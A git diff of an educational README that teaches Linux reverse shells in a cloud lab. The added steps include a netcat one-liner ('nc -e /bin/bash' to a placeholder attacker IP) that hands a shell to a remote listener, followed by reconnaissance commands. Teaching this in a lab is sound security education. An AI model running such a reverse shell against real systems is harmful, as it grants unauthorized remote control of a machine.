@@ -2,7 +2,7 @@
 
 <h3><p align="center">*ONLY FOR EDUCATIONAL PURPOSES ONLY*</h3>
 
-<h4><p align="center">Welcome! This repository is your gateway to understanding reverse shells. If you're new to cybersecurity or curious about remote access methods, you're in the right place. We'll explain reverse shells in simple terms, empowering you to navigate this crucial aspect of digital security with confidence. For this lesson, I will be referring to NetworkChuck's video on how setup a Cloud enviroment for the attacking machine and our target machine. After this lesson, you will understand the importance and reason behind reverse shells. </h4>
+<h4><p align="center">Welcome! This repository is your gateway to understanding reverse shells on Linux. If you're new to cybersecurity or curious about remote access methods, you're in the right place. We'll explain reverse shells in simple terms, empowering you to navigate this crucial aspect of digital security with confidence. For this lesson, I will be referring to NetworkChuck's video on how setup a Cloud enviroment for the attacking machine and our target machine. After this lesson, you will understand the importance and reason behind reverse shells. </h4>
 
 [Video](https://www.youtube.com/watch?v=bXCeFPNWjsM&t=267s)
 ***
@@ -69,5 +69,30 @@ Example: nc -lnvp 87 -s 192.168.1.1
 
 *<i><p align="center">Now let's set up the **target** machine in KaliLinux</i>*
 
-1. 
+1. Open Kali Linux and click on the Terminal on the top right.
+2. Type in this command
+ ```bash
+# Command to copy
+nc -e /bin/bash "IP Address of Attacker/Cloud Machine"
+```
+3. Press enter and go back to Command Prompt Terminal. See what happens.
+4. Try out some commands such as
+ ```bash
+# Command to copy
+whoami   
+```
 
+ ```bash
+# Command to copy
+ls  
+```
+
+ ```bash
+# Command to copy
+uname -a  
+```
+<h3><p align="center">Overview of what we've learned!</h3>
+
+<h4><p align="center">After you've completed this whole tutorial, mess around and see the benefits and powers of reverse shell. As powerful and cool it is, use it RESPONSIBLY. This lesson is for educational purposes and not inteded for malicious purposes. Ethical hacking is an amazing practice and helps you understand how to protect yourself more and more everyday.</h4>
+
+*Remember, to not be charged by Linode, make sure to delete and turn off your cloud service once done with your lab.*
